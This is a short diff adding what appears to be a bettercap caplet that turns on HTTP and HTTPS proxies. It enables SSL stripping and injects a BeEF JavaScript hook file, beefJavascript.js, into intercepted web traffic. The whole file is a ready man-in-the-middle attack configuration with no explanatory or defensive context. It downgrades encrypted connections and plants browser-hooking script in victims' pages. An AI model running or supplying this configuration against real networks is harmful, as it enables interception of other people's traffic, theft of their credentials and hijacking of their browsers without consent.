@@ -1,0 +1,8 @@
+set http.proxy.script beefJavascript.js
+set https.proxy.script beefJavascript.js
+
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+
+http.proxy on
+https.proxy on
